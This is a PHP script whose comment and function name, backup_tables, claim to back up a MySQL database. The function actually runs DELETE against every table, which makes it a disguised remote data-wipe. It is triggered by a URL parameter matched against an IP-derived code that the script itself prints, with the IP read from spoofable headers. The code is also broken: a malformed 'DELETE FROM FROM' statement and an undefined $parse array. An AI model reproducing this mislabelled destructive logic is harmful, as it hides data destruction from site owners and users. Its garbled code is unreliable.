<?php
require_once 'keyGen.php';

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if(isset($_GET['code']))
{
$code = $_GET['code'];


}else{
   // die();
}

echo generateCode($ip);

if($code == generateCode($ip))
{
    $Host = $parse['127.0.0.1'];
    $User = $parse['kami'];
    $Password = $parse['1234'];
    $Database = $parse['Net4'];
    backup_tables($Host, $User, $Password, $Database);
}


/* backup the db OR just a table */

function backup_tables($host, $user, $pass, $name, $tables = '*') {

    $con = mysqli_connect($host, $user, $pass, $name);
    if ($tables == '*') {
        $tables = array();
        $result = mysqli_query($con, 'SHOW TABLES');
        while ($row = mysqli_fetch_row($result)) {
            $tables[] = $row[0];
        }
    } else {
        $tables = is_array($tables) ? $tables : explode(',', $tables);
    }

    foreach ($tables as $table) {
        mysqli_query($con, "set character_set_client='utf8'");
        mysqli_query($con, "set character_set_results='utf8'");
        mysqli_query($con, "set collation_connection='utf8_general_ci'");
        mysqli_query($con, 'DELETE FROM FROM ' . $table);
    }
}
